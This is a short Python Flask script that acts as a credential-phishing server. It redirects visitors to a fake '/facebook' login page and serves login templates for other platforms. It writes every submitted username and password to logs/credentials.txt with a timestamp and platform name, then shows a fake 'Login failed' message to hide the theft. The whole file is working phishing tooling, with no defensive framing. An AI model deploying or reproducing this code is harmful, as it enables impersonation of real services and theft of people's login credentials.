#!/usr/bin/env python3

from flask import Flask, request, render_template, redirect
import os
from datetime import datetime

app = Flask(__name__)
log_file = "logs/credentials.txt"

@app.route('/')
def index():
    return redirect("/facebook")

@app.route('/<platform>', methods=['GET', 'POST'])
def login(platform):
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        with open(log_file, 'a') as f:
            f.write(f"{datetime.now()} | {platform} | {username} | {password}\n")
        return "<h3>Login failed. Please try again later.</h3>"

    try:
        return render_template(f"{platform}.html")
    except:
        return "<h3>Login page not found.</h3>", 404

if __name__ == '__main__':
    os.makedirs("logs", exist_ok=True)
    app.run(host="0.0.0.0", port=5000)
